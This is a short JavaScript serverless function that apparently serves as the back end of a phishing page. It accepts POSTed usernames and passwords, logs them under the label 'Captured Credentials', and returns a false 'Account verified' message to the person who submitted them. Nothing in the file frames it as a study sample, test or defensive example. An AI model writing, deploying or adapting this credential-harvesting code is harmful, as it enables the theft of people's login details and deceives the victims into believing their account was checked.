exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Only POST requests are allowed' }),
        };
    }

    const { username, password } = JSON.parse(event.body);

    console.log(`Captured Credentials - Username: ${username}, Password: ${password}`);

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Account verified' }),
    };
};